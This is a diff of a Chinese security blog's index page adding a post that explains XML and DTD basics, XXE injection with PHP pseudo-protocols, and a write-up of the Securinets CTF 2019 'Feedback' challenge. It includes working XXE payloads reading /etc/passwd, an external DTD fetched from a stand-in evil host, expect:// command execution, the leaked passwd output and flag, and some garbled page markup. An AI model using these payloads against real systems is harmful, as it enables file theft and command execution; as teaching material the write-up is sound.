@@ -157,6 +157,150 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-XXE漏洞与伪协议" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><p>XML：可拓展标记语言 </p>
+<p>功能：标记电子文件使其具有结构性的标记语言，从而达到数据的传输与存储</p>
+<h2 id="XML组成模块"><a href="#XML组成模块" class="headerlink" title="XML组成模块"></a>XML组成模块</h2><ul>
+<li>元素</li>
+<li>属性</li>
+<li>实体</li>
+<li>PCDATA</li>
+<li>CDATA</li>
+</ul>
+<ol>
+<li><p>元素</p>
+<p> 开始标签和闭合标签中的代码，可以嵌套，定义与HTML的元素一致</p>
+</li>
+<li><p>属性</p>
+<p> 标签可以拥有属性，属性总在开始标签中，以键值对的形式出现，定义与HTML的属性一致</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;computer.gif&quot; /&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>实体</p>
+<p> 定义普通文本的变量</p>
+</li>
+<li><p>PCDATA</p>
+<p> parsed character data</p>
+<p> PCDATA是会被解析器解析的文本</p>
+</li>
+<li><p>CDATA</p>
+<p> 即普通的 character data</p>
+<p> 与PCDATA相反，是不会被解析器解析的文本</p>
+</li>
+</ol>
+<p>注：XML允许用户自定义标签(当然也能自定义结构),比如<figure class="highlight plain"><figcaption><span>文档只使用在 HTML 标准中定义过的标签(当然结构也是预定义的)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## XML结构</span><br><span class="line">- 声明</span><br><span class="line">- DTD文档类型定义</span><br><span class="line">- 文档元素</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?xml version=”1.0” ?&gt;  #XML声明</p>
+<p>&lt;!DOCTYPE note[<br>    &lt;!ELEMENT note (to,from,heading,body)&gt;<br>    &lt;!ELEMENT to      (#PCDATA)&gt;<br>    &lt;!ELEMENT from    (#PCDATA)&gt;             #文档类型定义<br>    &lt;!ELEMENT heading (#PCDATA)&gt;<br>    &lt;!ELEMENT body    (#PCDATA)&gt;<br>]&gt;</p>
+<p><note></note></p>
+<p><to>George</to></p>
+<p><from>John                              #文档元素</from></p>
+<p><heading>Reminder</heading></p>
+<p><body>xxxxxxxx<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false}});</script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false}});</script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false}});</script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false}});</script></body><br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">## DTD 文档类型定义</span><br><span class="line"></span><br><span class="line">DTD作用是定义XML文档的合法构建模块</span><br><span class="line"></span><br><span class="line">使用形式：</span><br><span class="line"></span><br><span class="line">1、文档内声明</span><br></pre></td></tr></table></figure></p>
+<p>如同例子一样：&lt;!DOCTYPE 根元素 [元素声明]&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2、外部引用</span><br></pre></td></tr></table></figure></p>
+<p>具体说是引用外部的DTD</p>
+<p>&lt;!DOCTYPE 根元素 SYSTEM”文件名”&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">注：DTD文档的后缀名即为.dtd</span><br><span class="line"></span><br><span class="line">### DTD 实体</span><br><span class="line"></span><br><span class="line">实体前面提到过，基本就是变量</span><br><span class="line"></span><br><span class="line">DTD实体用于定义引用普通文本或特殊字符的快捷方式的变量，既可以内部声明也可以外部引用</span><br><span class="line"></span><br><span class="line">分类：</span><br><span class="line"></span><br><span class="line">1、内部实体变量</span><br></pre></td></tr></table></figure></p>
+<p>声明语法：&lt;!ENTITY 实体名 “实体内容”&gt;</p>
+<p>引用实体方式：&amp;实体名;</p>
+<p>&lt;?xml version=”1.0”?&gt;<br>&lt;!DOCTYPE test [<br>&lt;!ENTITY writer “Bill Gates”&gt;<br>&lt;!ENTITY copyright “Copyright W3School.com.cn”&gt;<br>]&gt;</p>
+<p><test>&writer;&copyright;</test><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2、外部实体变量(XXE根源)</span><br></pre></td></tr></table></figure></p>
+<p>声明语法：&lt;!ENTITY 实体名 SYSTEM”本地或远程服务器的文件”&gt;</p>
+<p>引用实体方式: &amp;实体名;  </p>
+<p>&lt;?xml version=”1.0”?&gt;<br>&lt;!DOCTYPE test [<br>&lt;!ENTITY writer “file:///etc/passwd”&gt;<br>]&gt;</p>
+<p><test>&writer;</test><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3、参数实体变量</span><br></pre></td></tr></table></figure></p>
+<p>声明语法：&lt;!ENTITY %实体名 SYSTEM “远程服务器上的XML文件”&gt;</p>
+<p>引用实体方式：%实体名;</p>
+<p>&lt;?xml version=”1.0”?&gt;<br>&lt;!DOCTYPE a [<br>    &lt;!ENTITY % d SYSTEM “<a href="http://testevil.com/evil.dtd&quot;&gt;" target="_blank" rel="noopener">http://testevil.com/evil.dtd&quot;&gt;</a><br>    %d;<br>]&gt;</p>
+<p>DTD文件中：<br>&lt;!ENTITY b SYSTEM “file:///etc/passwd”&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">注意：三种实体变量正对应着三种xxe的攻击方式，参数实体变量的使用容易和外部实体变量弄混</span><br><span class="line"></span><br><span class="line"># XXE 漏洞</span><br><span class="line"></span><br><span class="line">前置知识结束，XXE全称XML外部实体注入，本质上是XML中DTD允许使用外部实体，给予攻击者机会去将自定义的值发送给应用程序从而达到攻击者的目的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 攻击注入</span><br><span class="line"></span><br><span class="line">一、直接通过DTD外部实体声明</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?xml version=”1.0”?&gt;<br>&lt;! DOCTYPE a[<br>    &lt;!ENTITY b SYSTEM “file:///etc/passwd”&gt;<br>]&gt;</p>
+<c>&b;</c><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">二、通过引入外部DTD文档，再引入文档中事先准备好的实体(引入外部实体声明)</span><br></pre></td></tr></table></figure><br><br>&lt;?xml version=”1.0”?&gt;<br>&lt;!DOCTYPE a SYSTEM “<a href="http://testevil.com/evil.dtd&quot;&gt;" target="_blank" rel="noopener">http://testevil.com/evil.dtd&quot;&gt;</a><br><c>&b;</c>
+
+<p>DTD文件中：<br>&lt;!ENTITY b SYSTEM “file:///etc/passwd”&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">三、通过DTD外部实体声明后，再引入外部实体声明</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?xml version=”1.0”?&gt;<br>&lt;!DOCTYPE a [<br>    &lt;!ENTITY % d SYSTEM “<a href="http://testevil.com/evil.dtd&quot;&gt;" target="_blank" rel="noopener">http://testevil.com/evil.dtd&quot;&gt;</a><br>    %d;<br>]&gt;</p>
+<c>&amp;b</c>
+
+<p>DTD文件中：<br>&lt;!ENTITY b SYSTEM “file:///etc/passwd”&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">在常规的攻击中有两种情况用到参数实体。</span><br><span class="line"></span><br><span class="line">1、读取的文件包括特殊字符。</span><br><span class="line"></span><br><span class="line">2、在XXE攻击没有回显的情况下，可以利用参数实体来获取回显数据。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 利用危害</span><br><span class="line"></span><br><span class="line">主要是使用服务端语言的伪协议进行攻击（服务端会解析外部实体），根据服务端语言的不同，可使用的协议也是不同的</span><br><span class="line"></span><br><span class="line">以下仅以PHP伪协议进行举例</span><br><span class="line"></span><br><span class="line">1、任意读文件</span><br></pre></td></tr></table></figure></p>
+<p>file:///path/to/file.ext<br><a href="http://url/file.ext" target="_blank" rel="noopener">http://url/file.ext</a><br>php://filter/read=convert.base64-encode/resource=conf.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2、执行系统命令</span><br></pre></td></tr></table></figure></p>
+<p>expect://id<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</span><br><span class="line"></span><br><span class="line">3、探测内网端口</span><br></pre></td></tr></table></figure></p>
+<p>http://<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">直接使用http协议，通过返回值来探测端口</span><br><span class="line"></span><br><span class="line">4、DDOS</span><br><span class="line"></span><br><span class="line"># Feedback--Securinets CTF Quals 2019 </span><br><span class="line">一道XXE利用的题，做的时候一直以为是xss，完全搞错了方向.....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">初见是一个普通的评论页面</span><br></pre></td></tr></table></figure></p>
+<div class="container-contact100"><br><br>  <div class="wrap-contact100"><br>    <form class="contact100-form validate-form" method="POST" onsubmit="func();return false;"><br>      <span class="contact100-form-title"><br>        Send Us A Feedback<br>      </span><br><br>      <div class="wrap-input100 validate-input" data-validate="Please enter your name"><br>        <input class="input100" type="text" name="name" placeholder="Full Name"><br>        <span class="focus-input100"></span><br>      </div>
+
+<pre><code>  &lt;div class=&quot;wrap-input100 validate-input&quot; data-validate = &quot;Please enter your email: e@a.x&quot;&gt;
+    &lt;input class=&quot;input100&quot; type=&quot;text&quot; name=&quot;email&quot; placeholder=&quot;E-mail&quot;&gt;
+    &lt;span class=&quot;focus-input100&quot;&gt;&lt;/span&gt;
+  &lt;/div&gt;
+
+  &lt;div class=&quot;wrap-input100 validate-input&quot; data-validate = &quot;Please enter your message&quot;&gt;
+    &lt;textarea class=&quot;input100&quot; name=&quot;feedback&quot; placeholder=&quot;Your Feedback&quot;&gt;&lt;/textarea&gt;
+    &lt;span class=&quot;focus-input100&quot;&gt;&lt;/span&gt;
+  &lt;/div&gt;
+
+  &lt;div class=&quot;container-contact100-form-btn&quot;&gt;
+    &lt;button class=&quot;contact100-form-btn&quot;&gt;
+      &lt;span&gt;
+        &lt;i class=&quot;fa fa-paper-plane-o m-r-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;
+        Send
+      &lt;/span&gt;
+    &lt;/button&gt;
+    &lt;div id=&quot;Message&quot; color=&quot;Blue&quot; type=&quot;text&quot;&gt;&lt;/div&gt;
+  &lt;/div&gt;
+&lt;/form&gt;
+</code></pre><p>  </p></form></div><br></div><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其中发现一串JS代码,该function创建了XML文档并发送到feed.php中</span><br></pre></td></tr></table></figure><p></p>
+<p>function func(){<br>    var xml = ‘’ +<br>        ‘&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;’ +<br>        ‘<feedback>‘ +<br>        ‘<author>‘ + $(‘input[name=”name”]’).val() + ‘</author>‘ +<br>        ‘<email>‘ + $(‘input[name=”email”]’).val() + ‘</email>‘ +<br>        ‘<content>‘ + $(‘input[name=”feedback”]’).val() + ‘</content>‘ +<br>        ‘</feedback>‘;<br>    var xmlhttp = new XMLHttpRequest();<br>    xmlhttp.onreadystatechange = function () {<br>        if(xmlhttp.readyState == 4){<br>            console.log(xmlhttp.readyState);<br>            console.log(xmlhttp.responseText);<br>            document.getElementById(‘Message’).innerHTML = xmlhttp.responseText;<br>        }<br>    }<br>    xmlhttp.open(“POST”,”feed.php”,true);<br>    xmlhttp.send(xml);<br>};<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp截包，Request headers + Request body</span><br></pre></td></tr></table></figure></p>
+<p>POST /feed.php HTTP/1.1<br>Host: web2.ctfsecurinets.com<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: <em>/</em><br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate, br<br>Referer: <a href="https://web2.ctfsecurinets.com/" target="_blank" rel="noopener">https://web2.ctfsecurinets.com/</a><br>Content-Type: text/plain;charset=UTF-8<br>Content-Length: 139<br>Connection: keep-alive<br>Cookie: _ga=GA1.2.182302694.1553391694</p>
+<p>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</p>
+<p><feedback><author>123</author><email><a href="mailto:1533360534@qq.com" target="_blank" rel="noopener">1533360534@qq.com</a></email><content>undefined</content></feedback><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">发现后端会将```&lt;author&gt;```标签中的元素回显，因此构造XXE需要在该标签中引用实体</span><br><span class="line"></span><br><span class="line">测试</span><br></pre></td></tr></table></figure></p>
+<p>&lt;!DOCTYPE a [&lt;!ENTITY ckf SYSTEM ‘file:///etc/passwd’&gt; ]&gt;</p>
+<p><feedback></feedback></p>
+<p><author>&ckf;</author><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">回显成功</span><br></pre></td></tr></table></figure></p>
+<p></p><h4>Thanks For you Feedback root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/bin/false<br>mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false<br>simple_user:x:1000:1000::/home/simple_user:/bin/bash<br>Debian-exim:x:102:102::/var/spool/exim4:/bin/false<br></h4><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根据提示，猜测flag在```./flag```中，直接打开显示403 没有权限 </span><br><span class="line"></span><br><span class="line">构造XML外部实体</span><br></pre></td></tr></table></figure><p></p>
+<p>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;<br>&lt;!DOCTYPE a [&lt;!ENTITY ckf SYSTEM ‘php://filter/convert.base64-encode/resource=flag’&gt; ]&gt;</p>
+<p><feedback><author>&ckf;</author><email><a href="mailto:1533360534@qq.com" target="_blank" rel="noopener">1533360534@qq.com</a></email><content>undefined</content></feedback><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">回显如下，base64解码即可得到flag</span><br></pre></td></tr></table></figure></p>
+<p></p><h4>Thanks For you Feedback U2VjdXJpbmV0c3tYeGVfeFhFX0BMbF9UaDNfV0BZfQo=</h4><br><code>`</code><p></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/03/29/XXE漏洞与伪协议/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-HTML" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -847,83 +991,9 @@
 
 
   
-    <article id="post-httponly参数" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/07/23/httponly参数/">httponly参数</a>
-    </h1>
-  
-
-        
-        <a href="/2018/07/23/httponly参数/" class="archive-article-date">
-  	<time datetime="2018-07-23T14:38:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-23</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>简介：有关PhP设置httponly参数<br>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/07/23/httponly参数/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
     </nav>
   
 
@@ -1025,6 +1095,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Pwn</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">前端</a>
               </li>
              
@@ -1033,19 +1111,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Pwn</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">其他</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">吐槽</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1053,11 +1119,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">crypto</a>
+                <a href="javascript:void(0)" class="js-tag color3">吐槽</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">实习</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">crypto</a>
               </li>
             
             <div class="clearfix"></div>
